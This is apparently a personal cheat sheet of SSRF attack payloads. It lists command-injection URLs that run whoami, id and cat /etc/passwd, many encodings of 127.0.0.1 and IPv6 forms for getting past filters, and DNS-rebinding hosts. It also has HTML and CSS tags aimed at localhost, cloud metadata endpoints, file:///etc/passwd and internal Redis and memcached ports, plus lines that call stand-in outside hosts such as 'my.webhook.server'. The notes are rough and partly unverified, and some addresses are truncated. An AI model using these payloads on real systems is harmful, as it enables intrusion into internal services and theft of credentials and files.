### ssrf to rce

```
https://`whoami`.{domain}
https://$(whoami).{domain}
https://${whoami}.{domain}
https://{domain}/?`whoami`
https://{domain}?;id
https://{domain};id;
https://{domain};cat$IFS/etc/passwd;

Practically, path normalization is when a server resolves ../ when they are present in the URL

https://github.com/cujanovic/SSRF-Testing
https://medium.com/@yashprajapati791/from-cve-to-closure-my-journey-exploring-ssrf-in-next-js-13-5-1-cve-2024-34351-ae32f3878c84

### test with redirect
```
https://www.roninfo.ru/redir.php?q=http://bing.com@{payload}
```

### ipv4  127.0.0.1 Bypass 
```
http://①②⑦.⓪.⓪.①
http://127。0。0。1
http://localhost
http://127.1
http://0.0.0.0
http://0
http://2130706433
http://017700000001
http://0x7f000001
http://0x7f.0.0.1
http://0177.0000.0000.0001
http://2130706433
http://0177.0.0.1
http://10.0.0.1:80
http://172.31.22.1:443
http://192.168.1.1:8080
http://172.31.22.220:80
```
New
https://github.com/cujanovic/SSRF-Testing

http://0x7f.0x0.0x0.0x1
http://0177.00.00.01
http://0x7f.0x00.0x00.0x01
http://00177.00000.00000.00001

.{domain}


http://[::ffff:7f00:0001]

### ipv4 Bypass with DNS Rebinding
```
http://127.0.0.1.nip.io
http://127.0.0.2.nip.io
http://localtest.me
http://google.com.127.0.0.1.nip.io
http://google.com.0.0.0.0.nip.io
http://google.com.192.168.1.1.nip.io
http://google.com.172.31.22.1.nip.io
http://google.com.10.0.0.1.nip.io
http://google.com.192.168.1.1.nip.io
```

### IPv6 Bypass
```
http://[::ffff:127.0.0.1]
http://[::1]
http://[64:ff9b:1::7f00:1]
http://[0:0:0:0:0:0:0:1]
http://[0:0:0:0:0:ffff:7f00:1]
http://[::127.0.0.1]
http://[fd00::1]
http://[fc00::1]
http://[fe80::1]
http://[0000:0000:0000:0000:0000:0000:0000:0001]
```

### IPv6 for DNS Bypass
```
http://0-0-0-0-0-ffff-7f00-1.sslip.io
http://0-0-0-0-0-0-0-1.sslip.io
http://64-ff9b-1-0-0-0-7f00-1.sslip.io
http://0-0-0-0-0-0-7f00-1.sslip.io
http://fd00-0-0-0-0-0-0-1.sslip.io
http://fc00-0-0-0-0-0-0-1.sslip.io
http://fe80-0-0-0-0-0-0-1.sslip.io
```

### i not hink these works
```
http://2001-db8--1.ip6.name
http://--ffff-127.0.0.1.sslip.io
http://64-ff9b-1--7f00-1.sslip.io
http://--127.0.0.1.sslip.io
http://fc00--1.sslip.io
http://fe80--1.sslip.io
http://--1.sslip.io
http://--ffff-7f00-1.sslip.io

http://[::1%25eth0]
http://[::1%2511]
```

### simple payload
```
<iframe src="http://localhost:5000/admin"></iframe>
"><iframe src="http://169.254.169.254/latest/meta-data" height=2500 width=500>
'"> <img src=x onerror=fetch("https://my.webhook.server")</img>
"><iframe src="cat /etc/passwd" height=2500 width=500>
<object data="http://localhost:5000/admin" width="100%" height="500"></object>
<embed src="file:///etc/passwd">
<script src=”//my.tld/SSRF_exploit.js”></script>
```

### Send others all tag for testing ssrf
```
<!-- HTML Tag Based SSRF Payloads -->
<link rel="stylesheet" href="http://127.0.0">
<base href="http://169.254.169">
<audio src="http://127.0.0.1:22"></audio>
<video src="http://127.0.0.1:3306"></video>
<source src="http://localhost:6379">
<track src="http://127.0.0.1:8080">
<form action="http://localhost/admin" method="POST" id="x"></form><script>document.getElementById('x').submit();</script>
<meta http-equiv="refresh" content="0; url=http://127.0.0">

<!-- CSS Based SSRF Payloads -->
<div style="background-image: url('http://127.0.0.1:25')"></div>
<style>@import 'http://169.254.169';</style>
<li style="list-style-image: url('http://localhost:11211')"></li>
<div style="content: url('http://127.0.0.1:8000')"></div>

<!-- Protocol Bypasses & Local File Read -->
<iframe src="file:///etc/passwd"></iframe>
<img src="gopher://127.0.0.1:6379/_info">
<object data="dict://127.0.0.1:11211/stat"></object>
<embed src="http://2130706433"> <!-- Decimal for 127.0.0.1 -->
<script src="http://[::1]:80"></script> <!-- IPv6 for Localhost -->

<!-- XML/SVG Based (If image uploads are processed) -->
<svg xmlns="http://w3.org"><image href="http://127.0.0.1"/></svg>


<link rel="stylesheet" href="http://127.0.0">
<link rel="icon" href="http://169.254.169.254/latest/meta-data/">
<svg xmlns="http://w3.org"><image href="http://127.0.0"/></svg>
```
